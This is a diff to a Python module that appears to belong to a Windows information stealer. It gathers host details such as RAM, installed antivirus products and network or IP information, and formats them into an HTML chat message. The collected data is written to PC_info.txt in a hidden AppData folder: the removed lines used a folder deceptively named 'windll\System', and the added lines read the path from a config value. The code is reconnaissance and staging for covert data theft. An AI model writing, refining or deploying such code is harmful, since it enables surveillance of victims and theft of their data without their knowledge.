@@ -24,6 +24,7 @@ from winreg import OpenKey, HKEY_LOCAL_MACHINE, QueryValueEx
 from json import loads
 from uuid import UUID,getnode
 from manager.logger import Log
+from preferences.config import config
 
 logo = '''
 |-----------------------------------------------------------------------------|
@@ -241,13 +242,6 @@ RAM Used: {get_size(svmem.used)}
 ====================OTHER=====================
 Antiviruses: {', '.join(Antiviruses)}
 """
-    pathtofolder = environ['USERPROFILE'] + sep + r'AppData\Local'
-    try:
-        makedirs(rf'{pathtofolder}\windll\System')
-        file = open(rf'{pathtofolder}\windll\System\PC_info.txt', "w+", encoding='utf-8')
-        file.write(systeminfo)
-    except Exception as e:
-        Log(f"SystemInfo ---> {e}")
     
     msgdata=f"""
 <b>🖥System🖥</b>
@@ -268,4 +262,14 @@ Antiviruses: {', '.join(Antiviruses)}
 
 <b>📡Network📡</b>{ip_info_msg}
 """
+
+    try:
+        user = environ['USERPROFILE']
+        pathToLogs = f'{user}\\{config.pathToLogs}\\System'
+        makedirs(pathToLogs)
+        file = open(f'{pathToLogs}\\PC_info.txt', "w+", encoding='utf-8')
+        file.write(systeminfo)
+        file.close()
+    except Exception as e:
+        Log(f"SystemInfo ---> {e}")
     return msgdata
